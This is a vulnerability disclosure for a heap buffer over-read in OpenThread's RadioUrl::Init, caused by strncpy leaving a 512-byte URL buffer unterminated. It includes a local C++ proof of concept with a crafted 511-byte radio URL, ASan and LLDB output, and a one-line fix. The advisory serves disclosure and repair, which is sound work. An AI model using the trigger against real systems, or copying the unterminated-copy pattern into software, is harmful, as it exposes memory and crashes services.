# OpenThread RadioUrl Heap Buffer Over-Read

**Product:** OpenThread  
**Repository:** https://github.com/openthread/openthread  
**Component:** `src/posix/platform/radio_url.cpp`  
**Version:** main branch (commit latest)  
**Type:** Heap Buffer Over-Read (CWE-125)  
**CVSS 3.1:** 5.3 (Medium) - AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L

---

## Vulnerability Description

`RadioUrl::Init()` in `src/posix/platform/radio_url.cpp` uses `strncpy()` to copy a URL into a fixed-size buffer but fails to ensure null-termination when the input is exactly 511 bytes.

```cpp
void RadioUrl::Init(const char *aUrl)
{
    VerifyOrDie(strnlen(aUrl, sizeof(mUrl)) < sizeof(mUrl), OT_EXIT_INVALID_ARGUMENTS);
    strncpy(mUrl, aUrl, sizeof(mUrl) - 1);  // Copies 511 bytes, no null terminator
    SuccessOrDie(Url::Url::Init(mUrl));     // strlen() reads past buffer
}
```

- `sizeof(mUrl) = 512`
- `strncpy(mUrl, aUrl, 511)` copies bytes 0-510
- `mUrl[511]` is NOT set to `'\0'`
- `Url::Init()` calls `strlen(mUrl)` which reads past the 512-byte buffer

---

## Impact

1. **Information Disclosure:** `strlen()` reads heap memory beyond the allocated buffer until it finds a null byte
2. **Denial of Service:** Potential crash if ASan is enabled or if read crosses page boundary
3. **Attack Vector:** Malicious radio URL passed to OpenThread POSIX platform

---

## Steps to Reproduce

1. Clone OpenThread repository
2. Compile the PoC with AddressSanitizer:

```cpp
// radiourl_oob.cpp
#include "src/posix/platform/radio_url.hpp"
#include <cstring>
#include <string>

int main() {
    std::string url = "spinel+hdlc+uart://";
    url.append(492, 'A');  // Total: 511 bytes
    
    void *storage = operator new(sizeof(ot::Posix::RadioUrl));
    std::memset(storage, 0x41, sizeof(ot::Posix::RadioUrl));
    
    auto *radioUrl = new (storage) ot::Posix::RadioUrl(url.c_str());
    return 0;
}
```

3. Build with ASan:
```bash
c++ -fsanitize=address -g -O1 radiourl_oob.cpp \
    src/posix/platform/radio_url.cpp \
    src/lib/url/url.cpp \
    -I. -Isrc -Iinclude -o radiourl_oob
```

4. Run:
```bash
./radiourl_oob
```

---

## ASan Output

```
==38501==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6160000008a0
READ of size 513 at 0x6160000008a0 thread T0
    #0 strlen
    #1 ot::Url::Url::Init(char*) url.cpp:53
    #2 ot::Posix::RadioUrl::Init(char const*) radio_url.cpp:153
    #3 main
0x6160000008a0 is located 0 bytes after 544-byte region
SUMMARY: AddressSanitizer: heap-buffer-overflow in ot::Url::Url::Init(char*)+0x25
```

---

## LLDB Verification

Breakpoint after `strncpy()` shows buffer is not null-terminated:

```
(lldb) print sizeof(this->mUrl)
512

(lldb) expr this->mUrl[511]
'A' (0x41)    <-- Should be '\0'

(lldb) memory read -c8 &this->mUrl[508]
0x7fc6b700449c: 41 41 41 41 00 00 00 00    AAAA....
```

---

## Suggested Fix

```cpp
void RadioUrl::Init(const char *aUrl)
{
    VerifyOrDie(strnlen(aUrl, sizeof(mUrl)) < sizeof(mUrl), OT_EXIT_INVALID_ARGUMENTS);
    strncpy(mUrl, aUrl, sizeof(mUrl) - 1);
    mUrl[sizeof(mUrl) - 1] = '\0';  // Ensure null-termination
    SuccessOrDie(Url::Url::Init(mUrl));
}
```

Or use `strlcpy()` which always null-terminates.

---

## References

- CWE-125: Out-of-bounds Read
- strncpy() man page: "If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated."
